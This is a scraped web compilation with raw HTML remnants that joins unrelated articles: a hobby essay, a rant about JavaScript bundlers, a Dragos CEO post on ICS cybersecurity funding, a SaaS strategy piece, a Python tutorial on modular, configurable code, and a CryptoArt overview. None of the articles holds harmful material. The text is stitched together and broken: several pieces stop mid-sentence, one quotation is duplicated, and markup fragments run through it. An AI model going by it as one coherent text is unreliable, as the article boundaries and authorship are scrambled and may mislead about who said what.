460w,https://i.cbc.ca/1.5768390.1603139721!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/spacex-starlink.jpg 620w,https://i.cbc.ca/1.5768390.1603139721!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/spacex-starlink.jpg 780w,https://i.cbc.ca/1.5768390.1603139721!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/spacex-starlink.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5768390.1603139721!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/spacex-starlink.jpg"></p></div><figcaption>A SpaceX craft launches a cluster of 60 Starlink satellites.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      
        <p>It is especially easy at the beginning of a new year to fall into the trap of the <em>New Year's Resolution</em>. New goals and challenges and routines are established under the banner of <em>self-improvement</em>. Gyms and fitness centers become packed. Productivity books fly off the shelves. In the words of <em>The New Yorker's</em> Alexandria Schwarts, we're <a href="https://www.newyorker.com/magazine/2018/01/15/improving-ourselves-to-death">improving ourselves to death</a> and in our crusade to make time for all this self-improvement, hobbies are too often forgotten.</p>
<blockquote>
What I've discovered over time is that many of my skills and passions have developed only through little side-projects that never see the light of day.
</blockquote>

<p>For me, hobbies walk an enjoyable line between work and play: I often aim to learn something or try something new. Hobbies afford me the opportunity to challenge myself and embrace failure without worry of repercussion. A couple years ago, during a self-imposed redesign of this blog, I came across Robert Bringhurst's fantastic book, <a href="https://www.typotheque.com/books/the_elements_of_typographic_style">The Elements of Typographic Style</a>. Captured by his prose on the art of typography and font design, I started exploring and my website became an outlet for <a href="http://www.cachestocaches.com/2017/9/clear-visual-design-web/">experiments in typography</a>. My exploration grew to include other types of graphic design, and I've been experimenting with design software and creating vector art ever since.
Mastery has never been the goal: learning something new and having an outlet for my creativity are their own rewards. But despite the independent nature of my exploration, making high-quality graphs and figures became easier and the quality of my technical presentations at work has clearly improved.</p>

<p>My foray into design is far from the only instance of this, and many of my hobbies have even shaped my career. <span>In the preface to his book <a href="https://www.amazon.com/What-Dog-Saw-Other-Adventures/dp/0316076201">What The Dog Saw</a>, Malcolm Gladwell reflects "…it took me forever to realize that writing could be a <em>job</em>. Jobs were things that were serious and daunting. Writing was fun." </span>In college, my penchant for translating my physics homework into computer code landed me a job as an undergraduate researcher. Many of my colleagues have similar stories: their <em>fun little projects</em> would start to occupy more and more of their time until it would make its way into their work or somehow start shape the way they thought about a problem. For most of my hobby projects — even those tangentially related to my work — I rarely feel as if I am building skills that I'll ever use again. And yet, time and again, I have found a strange usefulness out of them: perhaps a colleague wanted to know if anyone had used an obscure programming library or get recommendations on some software for <code>X</code>, <code>Y</code>, or <code>Z</code>.
</p><p>In the preface to his book <a href="https://www.amazon.com/What-Dog-Saw-Other-Adventures/dp/0316076201">What The Dog Saw</a>, Malcolm Gladwell reflects "…it took me forever to realize that writing could be a <em>job</em>. Jobs were things that were serious and daunting. Writing was fun." </p>
<p>I'm not advocating that we should all take up new hobbies with the sole intention of developing skills useful for our careers — lest "hobbying" become a new class of New Year's Resolution. To be clear, for every hobby project of mine that has had a clear positive impact <em>in the wild</em> there have been another five or ten that yielded no extrinsic rewards (so far). But the combination of the satisfaction I get from freely exploring a new idea and the occasional long-term reward make me feel as if I am constantly growing.</p>
<p>In <a href="https://fermatslibrary.com/s/the-mundanity-of-excellence-an-ethnographic-report-on-stratification-and-olympic-swimmers#email-newsletter">The Mundanity of Excellence</a>, Daniel F. Chambliss argues that "excellence is a compound effect of mundane actions". My hobbies are nothing if not mundane, but — as I strive towards excellence — I can't help but notice that they've shaped my mental models and how I approach new problems at work. My most recent project involves playing around with <a href="https://www.blender.org/">Blender</a>, the open source 3D modeling and rendering software. I have no idea if any of this will yield any skills that prove useful to my career someday.</p>
<p>But, of course, that's the point.</p>

<p>As always, I welcome your thoughts (and personal anecdotes) in the comments below or on Hacker News.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><article><div><div><p><em>Looking for the dystopic Science Fiction short of the same name?</em> <sup id="fnref-1"><a href="#fn-1">1</a></sup></p><p>I wrote my first React library the other day.</p><p>I avoided it for as long as I could. But when initial work was completed, I had to face the facts: I needed to setup a JavaScript bundler.</p><p>Webpack is familiar. But I scan a number of other React libraries, and none of them are using Webpack. Is that because it's unfashionable or unfit? You can never tell with JavaScript.</p><p>So I decide on Rollup. Rollup uses a plugin system. Even though my setup feels very standard, it's unclear what precise combination of plugins I'll need to get this to work. A brute-force Google-Copy-Paste-Rebundle-Refresh-Delete-Repeat loop ensues.</p><p>Eventually, I discover it's not just about the combination of plugins - plugin <em>order</em> matters. That's because, taking a peek under the hood, it would appear that Unspeakable Things are happening. I regret peeking. Close the hood.</p><p>Here's the thing: <em>No one is at fault</em> here.</p><p>JavaScript is everything that is beautiful and frustrating about humanity. It is the people's language, yet not one we ever democratically elected. As with much of web technology, it evolved as a series of kludges, grand plans be damned. We <a href="https://dart.dev/">tried</a> <a href="https://clojurescript.org/">to</a> <a href="https://coffeescript.org/">stop</a> <a href="https://elm-lang.org/">it</a>, but this was swimming the Colorado river upstream.</p><p>Maybe we should have paddled harder.</p><p>It is only in JavaScript that we can find ourselves staring down <a href="https://github.com/facebook/react/issues/13991">this massive thread</a>, the issue colloquially referred to as Issue One-Three-Nine-Nine-One:</p><p><img src="https://acco.io/bundler-wars/the-thread.png" alt="The Thread" height="300"></p><p>In my new role as React Library Author, I have become quite familiar with Issue One-Three-Nine-Nine-One. I return to this thread so frequently, I'm afraid GitHub is going to throttle me for abuse.</p><p>The issue contains <del>242</del> 287 comments (and counting). Many comments are littered desperately with emojis, like ancient cairns marking solutions as either roads to prosperity or roads to doom.</p><p>Issue One-Three-Nine-Nine-One isn't working towards a solution. It's providing a marketplace, an open Bazaar where Finders from afar can peddle their solutions - and Seekers can desperately Copy-Paste-Rebundle-Refresh - <em>no, that wasn't it either.</em></p><p><img src="https://acco.io/bundler-wars/bazaar.jpg" alt="Ancient Bazaar" height="400"></p><blockquote><p><em>Solutions for webpack! Get ye solutions for webpack!</em></p><p><em>Here lies the command ye seek! It uses an obscure tandem of <code>npm-link-shared</code> and <code>prestart</code> hooks. Don't ask questions, yer fine!</em></p><p><em>This 30-minute blog post will ward off Double-React Syndrome for good!</em></p></blockquote><p>I feel like I've tried every solution, every salve. I feel hopeless, despondent.</p><p>@apieceofbart goes so far as to (very kindly) suggest:</p><blockquote><p>"It was obviously my mistake of using two copies of React but I agree that it would be great if the error message was better."</p></blockquote><p>No, @apieceofbart, this is not your fault. It's not React's fault. It's not ECMA's fault or Eich's fault.</p><p>This is our fault. JavaScript is our problem.</p><p>I get it working. How? I'm not totally sure. While my initial steps were measured, I quickly deteriorated into a debug frenzy. Copying and pasting lines from blog posts found on page 5 of a Google Search. Swapping out bundlers - just to swap them back in. <code>rm -f</code>'ing <code>node_modules</code> so many times, I was certain that those blocks of my SSD were going to go permanently dark.</p><p>My solution is far from optimal. I have a separate repo for testing my library, but I can't get <code>npm link</code> to work. But if, with each change to my library, I (1) bump the version, (2) bundle it, (3) push it to npm, (4) bump the version in my test repo, (5) <code>yarn install</code> -- my app compiles and I can test my library.</p><p>This is not sustainable. But I guess it <em>is</em> JavaScript, after all.</p><p>I feel dejected. I have a solution, but it's unfulfilling. I feel like a cheat, a fraud, a copypasta programmer who doesn't understand the duplo blocks he's piecing together. What craftsman remains so perplexed by his tools after over a decade of experience?</p><p>A tool is supposed to <em>feel good</em> - sturdy, predictable, precise. A tool is supposed to make its wielder <em>feel powerful</em>. JavaScript and its maddening toolchain, from beginning to end, will find little ways to undermine you. To humiliate you.</p><p>As someone that has programmed JavaScript professionally since 2013, I am convinced we are under a collective delusion. This is what Stockholm Syndrome feels like on the inside.</p><hr><p><em>December 2020</em>: I broke free this year, at least partially. After years of Node back-ends, I switched to Elixir/Phoenix.</p><p>I've been on Elixir/Phoenix for 6+ months now, and yet the stack still makes me smile at least once per day. It is such a pleasure to have a thoughtful, well-designed, integrated developer experience from end-to-end.</p><p>I feel like a craftsman reunited with his tools again. With JavaScript relegated to just the front-end, I feel at peace.</p><p>Remember, dear reader, that you <em>do</em> have a choice.</p><hr><div><p><img height="50" src="https://acco.io/sync-inc-logo.svg" alt="Sync Inc Logo"></p><p>We're in the earliest of days building <a href="https://syncinc.so/">Sync Inc</a>.

			<p>“ICS cybersecurity? What’s that? Is it worth doing? Can it be done? No it cannot, I heard…Even if you did the market isn’t large enough to support it long term”</p>
<p>Dragos, Inc.&nbsp;<a href="https://www.businesswire.com/news/home/20201208005280/en/Dragos-Announces-Record-Setting-110M-Investment-in-Industrial-Cybersecurity-with-Series-C-Funding" target="_blank" rel="nofollow noopener">announced today its C-Series financing</a>&nbsp;which is the largest investment ever into an industrial control system (ICS) / operational technology (OT) cybersecurity company. The investment is $110M for a total raised of more than $158M over the four years the company has been around. As the co-founder and CEO it fills me with great pride because of the team Dragos has assembled and our amazing customers who have truly partnered with us on our collective journey. Seeing them leverage our technology, services, and intelligence to make their companies more secure and further their maturity is something amazing to behold. Most citizens never understand or gain insight into how hard their infrastructure companies work to provide safe and reliable services and goods; I can tell you first hand this community works amazingly hard. There’s a lot of unknown passionate professionals running proof of concepts, implementing projects, advocating internal to their org, getting trained, working long hours, etc. all to allow companies like Dragos to exist to serve this community. Thank you.</p>
<p>I’ve written before on what it’s like to raise venture capital, you can view that blog&nbsp;<a href="https://www.robertmlee.org/what-its-like-to-raise-venture-capital-just-my-experience/" target="_blank" rel="nofollow noopener">here</a>. In this post I want to walk through some of the challenges I’ve faced for Dragos from an investment perspective and the path along the way explicitly to help explain what I think this investment means for the broader OT/ICS cybersecurity market and community. I’ll speak a lot about our journey so far but the point isn’t about Dragos’ financing but instead the amazing realization that OT cybersecurity is worth doing, a large enough market to do it in, and that it can be done.</p>
<p>I will say without any intent to hype it up that I do believe this is a watershed moment and I hope to share that perspective with you.</p>
<p><img src="https://media-exp1.licdn.com/dms/image/C5612AQE2hi-NmAf30A/article-inline_image-shrink_1500_2232/0/1607358704230?e=1613001600&amp;v=beta&amp;t=1esWaEXl6ipzr5O1sm-1ZmyZO1C3wkX8qJGPdNbIrzY" alt="No alt text provided for this image" data-media-urn="" data-li-src="https://media-exp1.licdn.com/dms/image/C5612AQE2hi-NmAf30A/article-inline_image-shrink_1500_2232/0/1607358704230?e=1613001600&amp;v=beta&amp;t=1esWaEXl6ipzr5O1sm-1ZmyZO1C3wkX8qJGPdNbIrzY"></p>
<p>I started Dragos a little over four years ago with my co-founders Jon Lavender and Justin Cavinee who had worked with me at the National Security Agency on our mission of identifying and responding to threats to ICS worldwide. We started the company not out of the desire to create a company or technology. To be candid we all abhorred the idea of becoming a software vendor after a career of being practitioners and community members in this space. But we did so out of a stark realization that the industry was changing and the threats were becoming more numerous and aggressive. What we were seeing as “answers” were a copy/pasting of IT security best practices into the ICS networks with little regard for the unique mission and threats those systems faced. I had authored the SANS ICS515 class on ICS incident response and network monitoring to help educate and train the workforce but realized that the only way to scale human knowledge fast enough in the face of what we were seeing was to also ensure those practitioners had ICS specific cybersecurity technology as well. We needed to do this in a company that would refuse to get acquired and be a long term player to put a dent in the problem. It’s my view though that to make the best technology you need the best people and you need to be hyper informed on the changing risk landscape if you’re going to counter it. So we built Dragos focused on our visibility, monitoring, and response technology but also with a professional services team of ICS cybersecurity experts to do everything from threat hunting and pentesting to incident response and architecture reviews while being trusted advisors to our customers. To inform everything we did and to help educate our community we built an intelligence team to identify and track threats specifically focused on ICS. To date we track 14 state adversaries explicitly doing so. I say all that in context of this fund raising to say – most investors hated our approach.</p>
<p>We got off the ground with a Seed investment from DataTribe. The only reason they invested was they had a background in the intelligence community and military and understand that we were mission focused. I’m sure they didn’t know much about what we wanted to do but they knew the problem was important and we were the team that would stop at nothing to satisfy the mission. When I went to raise the Series A round of $10M to finance our operations I met with and pitched well over 100 investors. Many of them sought us out to learn more about ICS/OT cybersecurity. The broader OT security market which encompasses ICS and the industrial internet of things (IIoT) (not to be confused with IoT, Alexa and a Gas Turbine have little in common) was very interesting to investors but none of them seemed to believe it was worth focus. I received pushback from the investors that fell into three distinct camps; these camps were challenges I heard from plenty of non-investors as well that I had encountered over the years:</p>
<ul>
<li>Companies have tried to do ICS security before and failed. It’s not doable. People don’t care past regulation or fear. These companies won’t change. OT specific cybersecurity will never be successful.</li>
<li>The market is too small. If you’re interested in getting quickly acquired we’ll invest but if you’re interested in going the distance, we’re not along for the ride. The OT market is so niche.</li>
<li>IT and OT are converging. There won’t be an OT network in the years to come. IT? OT? It’s all just T. Enterprise cybersecurity will be rolled into the plants there’s no need for OT specific cybersecurity. OT specific security isn’t worth doing.</li>
</ul>
<p>Finding people that didn’t agree with the three points above in the broader market was hard. In reality, very few of the practitioners in our small ICS security community believed such things. I think many people in our community have wondered if it’ll take some giant cyber attack on ICS to get people to take it seriously, but my view was “we’ve had all the attacks we need.” Every industry has representative attacks and stories. That wasn’t the issue or need and no one should hope for it. The reality was there wasn’t a large investable market which means for the business there was no obvious need to address this risk. I viewed building a technology company and staying around long term as necessary to getting these companies resources for workforce development, training, etc. as much as anything else.</p>
<p>On the three points here’s where I disagree in order:</p>
<ul>
<li>Just because a few companies have failed on this path doesn’t mean that it won’t be successful. But more importantly the efforts I’ve seen failed before were largely re-skinned IT security efforts with some ICS marketing. It was obvious they were going to fail. This community does care about its infrastructure but we are a community of people who understand what does and doesn’t work. Our infrastructure members will invest beyond regulation and fear but not in things they don’t believe will work. Also undeniably over the last decade there has been a larger and more proactive community advocating cross company cross vendor cross conference etc. on what does and doesn’t work.</li>
<li>The OT market is huge. It’s hard to put a real number on it; some orgs claim 20-30B, but however you size it, it’s huge. Most people associate it with electric utilities and oil and gas. But manufacturing, rail, water, mining, transportation, etc. should come to mind. And the physical systems in the data center. And building automation systems. And airports. And and and. It’s actually harder to find companies that don’t have OT than those that do. These businesses aren’t in the business of selling emails. They produce goods, interact with the physical world, and provide services all powered by OT. The major risk is in the OT and when executives are aware of that and have an answer to address it they will in a way a majority of investors I’ve met have misunderstood.</li>
<li>IT and OT convergence happened a decade ago. I’m near tired of hearing how it’s “coming.” We have had Windows in ICS/SCADA/DCS/OT/etc. networks for more than a decade. The convergence is actually the digital transformation of these organizations coming at the same time of ICS specific adversaries. But no matter what the underlining operating system is that’s not the point. The point of OT cybersecurity is that the mission is different. The threats are different. The risks are different. The culture to get the job done is different. The challenges are different to succeed. Therefore the way you secure it will be different. I’m not saying all IT security is useless in the plants. There’s plenty we can learn from and adopt. What I’m saying is the unique and most critical part of these businesses deserves a specific focus that understands and accounts for the people, culture, process, technology, mission, risks, threats, etc. of that side of the business. To not accept that is naïve.</li>
</ul>
<p>When I went to investors saying we wanted to focus exclusively on OT cybersecurity and we wanted to partner with our customers not just in providing technology but also having smart people and actual insights to provide it didn’t go so well with most of them. You cannot describe all the VCs in one broad stroke just like you cannot describe any group; and I’ve met and really enjoyed getting to know plenty of VCs, but to say the vast majority didn’t understand this market is an understatement.</p>
<p>Not only were the pushbacks from above tangible but also “and you want to hire experts to do professional services? Won’t that lower the margins on the software sales? I don’t think that’s a good idea.” But even extremely mature companies are relatively immature in their OT cybersecurity journey and need a partner not just a technology. That’s also how we get better. So it was non-negotiable. Our team’s people are and were our secret weapon. For all the words like innovation and disruption that get flaunted in Silicon Valley it was interesting how many …</p></div></div>

            <p>In <a href="https://www.saastr.com/whats-your-moat/">What's Your Moat</a>, Jason Lemkin lists several moats (sources of defensibility) that apply to SaaS businesses. I categorised them based on the <a href="https://www.amazon.com/7-Powers-Foundations-Business-Strategy-ebook/dp/B01MRLFFQ7">7 Powers</a> framework by Hamilton Helmer and found two powers missing (Cornered Resource and Process Power).</p><p>While Cornered Resources (such as a strong early team) are commonly considered doctrine rather than a moat, the omission of process power was more interesting.</p><h3 id="what-is-process-power">What is Process Power?</h3><p>Helmer describes companies with Process Power as follows:</p><blockquote>Benefit. A company with Process Power is able to improve product attributes and/or lower costs as a result of process improvements embedded within the organization. For example, Toyota has maintained the quality increases and cost reductions of the TPS over a span of decades; these assets do not disappear as new workers are brought in and older workers retire.<p>Barrier. The Barrier in Process Power is hysteresis: these process advances are difficult to replicate, and can only be achieved over a long time period of sustained evolutionary advance.</p></blockquote><p>He admits that process power is rare and difficult to achieve. But is it too rare to apply to SaaS companies?</p><p>On one hand, the path to growing a SaaS business is <a href="https://stripe.com/gb/atlas/guides/business-of-saas">well benchmarked</a> and there are processes describing anything from finding leads to deploying reliable infrastructure.</p><p>But there are companies that get very different results.</p><h3 id="the-process-outliers">The process outliers</h3><p><a href="https://ahrefs.com/">Ahrefs</a> is a popular SEO tool with a fifth of the engineering resources of their biggest competitor Moz. They <a href="https://ahrefs.com/blog/keywords-explorer-3-0/">claim to achieve this by using an OCaml based stack</a> also favoured by Wall Street traders <a href="https://www.janestreet.com/">Jane Street</a>.</p><p><a href="https://www.tinycapital.com/">Tiny</a> is a start-up conglomerate that uses several ideas like simple positioning and No Code to quickly spin up new businesses in record speed.

The Theory of Constraints predicts that every company is usually constrained by one bottleneck at a time, called a “constraint” and releasing that constraint is the key for increasing output.</p><p>Another theory, promoted by Douglas Engelbart is the <a href="https://www.dougengelbart.org/content/view/192/165/">ABCs of Organizational Improvement</a>. Engelbart argues that we should manage not only core activities (also known as “A activities” or “Business as usual”) but have explicit roadmaps for both B activities (“improving how we do A”) and C activities (“improving how we improve”). By focusing on process improvement explicitly, we can create compounding leverage for core activities.</p><p>A more modern example of continuous process improvement is described in the <a href="https://medium.com/quantumblack/the-protocol-series-how-formula-1-pitstop-teams-inspired-the-codification-of-our-ways-of-working-7b59b40a8fa1">Protocol Series</a> by QuantumBlack.</p><p>To summarise, having a great process is not the same as having great execution and we should not neglect that, even in SaaS.</p><hr><p><strong>P.S.</strong> Here is the categorization of the SaaS moats I went with.

<h2 id="introduction">Introduction</h2>

<p>Let’s start with the facts : writing code for a side-project or a class-project is very different from writing code for a large organization. Among other things, you face the following requirements :</p>
<ul>
  <li><strong>collaboration</strong> : it’s not only your code, so you need to make sure that the components you add play nicely with your teammates’</li>
  <li><strong>compatibility over time</strong> : not only does your new feature need to work, it also has to integrate nicely with the existing logic, without breaking everything. What’s more, in the future, you want to avoid having to modify and update your code.</li>
  <li><strong>flexibility in usage</strong> : you need to keep in mind that specifications are likely to evolve in the future, and you need to plan accordingly (as much as possible without overdoing it), as you might need to support a wider variety of use cases. Ideally, the design itself should be modular enough so that adding new functionality is easy.</li>
</ul>

<p>While the previous points may seem obvious, it requires patience and experience to successfully address them, especially if you write python code : as a scripting language by nature, it’s easy to forget good software-engineering practices and dive right in. After all, running code is better than nice-but-unusable code.</p>


<h2 id="a-simple-example">A simple example</h2>

<p>Let’s take a simple example : we want to compute <code>2 * x + 1</code>.</p>

<p>If I want to quickly put something together, I can just write a short script that does the job</p>

<div><div><pre><code><span>def</span> <span>f</span><span>(</span><span>x</span><span>):</span>
    <span>return</span> <span>2</span> <span>*</span> <span>x</span> <span>+</span> <span>1</span>

<span>f</span><span>(</span><span>2</span><span>)</span>
</code></pre></div></div>

<p>Of course this is a dummy example, but you can extrapolate, until you reach the complexity of an actual program. Once your initial script becomes too long, a natural thing to do is to create modules and helper functions, in an attempt to improve code reuse, effectively performing <a href="https://caseymuratori.com/blog_0015">semantic compression</a>. Now you have a script disguised as a “library”. And this is perfectly fine, if it’s the first iteration of a project, or if you only need to support one use case.</p>


<h2 id="a-need-for-configurable-code">A need for configurable code</h2>

<p>One day, the project manager comes to see you, asking to support a new use case : <code>2 * (2 * x + 1)</code>.</p>

<p>That’s easy, let’s do something like</p>

<div><div><pre><code><span>def</span> <span>f</span><span>(</span><span>x</span><span>,</span> <span>use_case</span><span>):</span>
    <span>if</span> <span>use_case</span> <span>==</span> <span>"use_case_1"</span><span>:</span>
        <span>return</span> <span>2</span> <span>*</span> <span>x</span> <span>+</span> <span>1</span>
    <span>elif</span> <span>use_case</span> <span>==</span> <span>"use_case_2"</span><span>:</span>
        <span>return</span> <span>2</span> <span>*</span> <span>(</span><span>2</span> <span>*</span> <span>x</span> <span>+</span> <span>1</span><span>)</span>
    <span>else</span><span>:</span>
        <span>raise</span> <span>ValueError</span><span>(</span><span>"Use case not supported."</span><span>)</span>

<span>f</span><span>(</span><span>2</span><span>,</span> <span>"use_case_2"</span><span>)</span>
</code></pre></div></div>

<p>In real life, this means passing combinations of arguments to helper functions, resulting in something quite complicated to maintain. As different use cases keep coming, the number of <code>if ... else ...</code> statements increases, reaching an unhealthy ratio. Soon, the combination of options forces parts of your code to support a combinatorial number of possibilities. If you have 2 main options with 10 possibilities each, and each combination requires some custom logic, that’s 10 x 10 possibilities! Chances are that in parts of the code that you may be less familiar with, a specific combination of options causes a failure. Hopefully you follow the guidelines of test-driven development and such a liability will be exposed before any release.</p>


<h2 id="modularizing-your-code">Modularizing your code</h2>

<p>After a while, the expectations become more generic and you’re required to support “all combinations of <code>2 * x</code> and <code>x + 1</code>”. Worse, you see a near future where other operations will have to be supported, like <code>3 * x</code>. You should probably isolate each of these operations from each other as well as how you combine them together.</p>

<p>After some time spent rewriting parts of the code to make it more modular, you come to the conclusion that each of these operations is independent from the others and that combining them together is another issue (<a href="https://en.wikipedia.org/wiki/Separation_of_concerns">Separation of Concern</a>). Each operation should be responsible of one thing and one thing only (<a href="https://en.wikipedia.org/wiki/Single_responsibility_principle">Single Responsibility Principle</a>), while following the same contract.</p>

<p>In python, one the right ways of doing this is to define an “interface” for your operations (let’s call them <code>layers</code>), using an abstract class</p>

<div><div><pre><code><span>from</span> <span>abc</span> <span>import</span> <span>ABC</span><span>,</span> <span>abstractmethod</span>


<span>class</span> <span>BaseLayer</span><span>(</span><span>ABC</span><span>):</span>

    <span>@</span><span>abstractmethod</span>
    <span>def</span> <span>forward</span><span>(</span><span>self</span><span>,</span> <span>x</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span><span>()</span>
</code></pre></div></div>

<p>and implement different versions of that base class</p>

<div><div><pre><code><span>class</span> <span>PlusOneLayer</span><span>(</span><span>BaseLayer</span><span>):</span>

    <span>def</span> <span>forward</span><span>(</span><span>self</span><span>,</span> <span>x</span><span>):</span>
        <span>return</span> <span>x</span> <span>+</span> <span>1</span>

<span>class</span> <span>TimesTwoLayer</span><span>(</span><span>BaseLayer</span><span>):</span>

    <span>def</span> <span>forward</span><span>(</span><span>self</span><span>,</span> <span>x</span><span>):</span>
        <span>return</span> <span>2</span> <span>*</span> <span>x</span>
</code></pre></div></div>

<p>Finally, chaining the layers is the job of some other class</p>

<div><div><pre><code><span>class</span> <span>Model</span><span>:</span>

    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>layers</span><span>):</span>
        <span>self</span><span>.</span><span>layers</span> <span>=</span> <span>layers</span>

    <span>def</span> <span>forward</span><span>(</span><span>self</span><span>,</span> <span>x</span><span>):</span>
        <span>for</span> <span>layer</span> <span>in</span> <span>self</span><span>.</span><span>layers</span><span>:</span>
            <span>x</span> <span>=</span> <span>layer</span><span>.</span><span>forward</span><span>(</span><span>x</span><span>)</span>
        <span>return</span> <span>x</span>
</code></pre></div></div>

<p>In this example we used object-oriented programming to modularize the code, but other options are also possible (using functions with similar signatures for example). However, the nice thing about OOP is that it lets you define contracts. Once implemented, your editor will help you find errors and it might speedup the whole development process while improving code robustness.</p>


<h2 id="using-the-modularized-code">Using the modularized code</h2>

<p>Okay so now we have abstracted and isolated the different components of the program. How do we use it?</p>


<h3 id="with-python-scripts-outside-the-library">With python scripts outside the library</h3>

<p>The easiest way is to let the different users of your library define one script per pipeline. For each of the previous use cases, we end up with a script</p>

<div><div><pre><code><span># use-case-one.py
</span><span>times_two</span> <span>=</span> <span>TimesTwoLayer</span><span>()</span>
<span>plus_one</span> <span>=</span> <span>PlusOneLayer</span><span>()</span>
<span>model</span> <span>=</span> <span>Model</span><span>([</span><span>times_two</span><span>,</span> <span>plus_one</span><span>])</span>
<span>model</span><span>.</span><span>forward</span><span>(</span><span>2</span><span>)</span>
</code></pre></div></div>

<p>and</p>

<div><div><pre><code><span># use-case-two.py
</span><span>times_two</span> <span>=</span> <span>TimesTwoLayer</span><span>()</span>
<span>plus_one</span> <span>=</span> <span>PlusOneLayer</span><span>()</span>
<span>model</span> <span>=</span> <span>Model</span><span>([</span><span>times_two</span><span>,</span> <span>plus_one</span><span>,</span> <span>times_two</span><span>])</span>
<span>model</span><span>.</span><span>forward</span><span>(</span><span>2</span><span>)</span>
</code></pre></div></div>

<p>At this point, it may look like we haven’t made a lot of progress. It turns out that in the process of making our code modular and reusable in a nice an abstract way</p>
<ul>
  <li>we created a library (a collection of tools that can be easily re-used), in other words, we created a high-level API that users can build on (see <a href="https://www.youtube.com/watch?v=aAb7hSCtvGw">how to design a good API and why it matters</a>)</li>
  <li>we separated the layers’ <strong>implementation</strong> (don’t forget that this is a dummy example but the actual operations you are implementing are much more complicated) from <strong>usage</strong>. Actually, each of these scripts can be seen as a special configuration.</li>
</ul>

<blockquote>
  <p>It is interesting to notice that the workflow manager <a href="https://airflow.apache.org/">airflow</a> lets you define pipelines using a python interface (Directed Acyclic Graphs, Operators, etc.). From the documentation : <em>“One thing to wrap your head around (it may not be very intuitive for everyone at first) is that [Airflow Python scripts are] really just configuration files specifying DAG’s structure as code”</em></p>
</blockquote>

<p>While this may sound obvious, it is crucial to separate implementation from usage, especially because it’s so easy to mix the two and end up with a library that is part script-like and usage-specific, side-by-side with a collection of helper functions that may have otherwise been reusable for a wider variety of use cases.</p>


<h3 id="with-config-files">With config files</h3>

<p>While python files are probably sufficient in most cases (and this should probably always be possible because pipeline creators are likely to be programmers, and who knows what they will have in mind), some situations might benefit from the use of a more convenient pipeline definition format. Advantages and requirements may include</p>
<ul>
  <li>Avoid duplication by splitting configs into sub-configs.</li>
  <li>Use a format that can easily be shared.</li>
  <li>Provide a way for non-programmers to define their own pipelines.</li>
  <li>Provide a lightweight, less-verbose way of defining pipelines.</li>
</ul>

<p>There are a number of good formats that are widely adopted in the python community</p>
<ul>
  <li><code>.json</code> (JavaScript Object Notation), probably the most popular format, as it resembles python dictionaries.</li>
  <li><a href="https://jsonnet.org/"><code>.jsonnet</code></a>, built on top of json, adds support for imports, variable definition and much more, before “compilation” to a standard <code>.json</code>.</li>
  <li><code>.ini</code> (see <a href="https://docs.python.org/3/library/configparser.html">configparser</a>)</li>
  <li><code>.yaml</code></li>
  <li><code>.xml</code></li>
</ul>

<p>Having said that, the question becomes : what do we write in these configuration files, and how do we reload them?</p>

<p>Usually, the first step would be to implement a way to create an object from a python dictionary. There are multiple ways of doing it</p>
<ul>
  <li>define a <code>Serializable</code> interface and have each class implement a class method <code>from_params(cls, params)</code> that creates an object from a dictionary.
    <div><div><pre><code><span>class</span> <span>Serializable</span><span>(</span><span>ABC</span><span>):</span>

  <span>@</span><span>abstractclassmethod</span>
  <span>def</span> <span>from_params</span><span>(</span><span>cls</span><span>,</span> <span>params</span><span>):</span>
      <span>raise</span> <span>NotImplementedError</span><span>()</span>
</code></pre></div>    </div>
    <p>For example</p>

  </li>
  <li>use a <code>Schema</code> approach. In other words, delegate the creation of objects from dictionaries to another class. This is probably the most common approach, but might be overkill in some cases. Have a look at the great <a href="https://marshmallow.readthedocs.io/en/stable/">marshmallow</a> library.</li>
</ul>

<p>Another tip : you might want to validate and normalize the dictionaries before creating instances from them. This can be useful to check for missing entries, fill-out default values, rename parameters, etc. I’ve been using <a href="https://docs.python-cerberus.org/en/stable/">cerberus</a> for that purpose.</p>

								<div>
									<p><span>*</span><i><span>Neither Jason nor I support the wrongful affiliation of Pepe and the alt-right</span></i><span>*</span></p>
<p><span>If you have no idea who/what Pepe is or how a simple frog cartoon became affiliated with the alt-right, I can’t recommend watching the “</span><a href="https://www.youtube.com/watch?v=97akfYZv28I&amp;feature=youtu.be&amp;ab_channel=ReadyFictions"><span>Feels Good Man</span></a><span>” documentary enough. Crazy story!&nbsp;</span></p>
<p><span>Anyways, onto the rise of CryptoArt and what it is: “CryptoArt are rare digital artworks, sometimes described as digital trading cards or “rares”, associated with unique and provably rare tokens that exist on the blockchain. The concept is based on the idea of digital scarcity, which allows you to buy, sell, and trade digital goods as if they were physical goods. This system works due to the fact that, like Bitcoins and other cryptocurrencies, CryptoArt exists in limited quantities. Popular early examples include </span><a href="https://www.cryptokitties.co/"><span>CryptoKitties</span></a><span>, </span><a href="https://www.larvalabs.com/cryptopunks"><span>CryptoPunks</span></a><span>, </span><a href="https://rarepepewallet.com/"><span>Rare Pepe</span></a><span>, </span><a href="https://curio.cards/"><span>CurioCards</span></a><span>, and </span><a href="https://dada.nyc/home"><span>Dada.nyc</span></a><span>.” — Jason Bailey</span></p>
<p><span>To better understand CryptoArt, Jason shares some of the ways the movement of CryptoArt was shaped (these are only some of the examples) →&nbsp;</span></p>
<ul>
<li><b><i>Geographically agnostic</i></b><span>: CryptoArt is powered by the internet. It’s truly the first global art movement, thanks to the internet.&nbsp;</span></li>
</ul>
<ul>
<li><b><i>Democratic/Permissionless</i></b><span>: Everyone and anyone is encouraged to participate. Any skill level, class, gender, race, age, etc. are welcome.</span></li>
</ul>
<ul>
<li><b><i>Anonymous</i></b><span>: Use of pseudonyms allows artists to create and sell art while staying anonymous (if preferred), freeing them from social judgment.</span></li>
</ul>
<ul>
<li><b><i>Memetic</i></b><span>: CryptoArt is often literally memes valued for its ability to spread quickly.&nbsp; The difference? The “Meme Economy” is now a reality.</span></li>
</ul>
<ul>
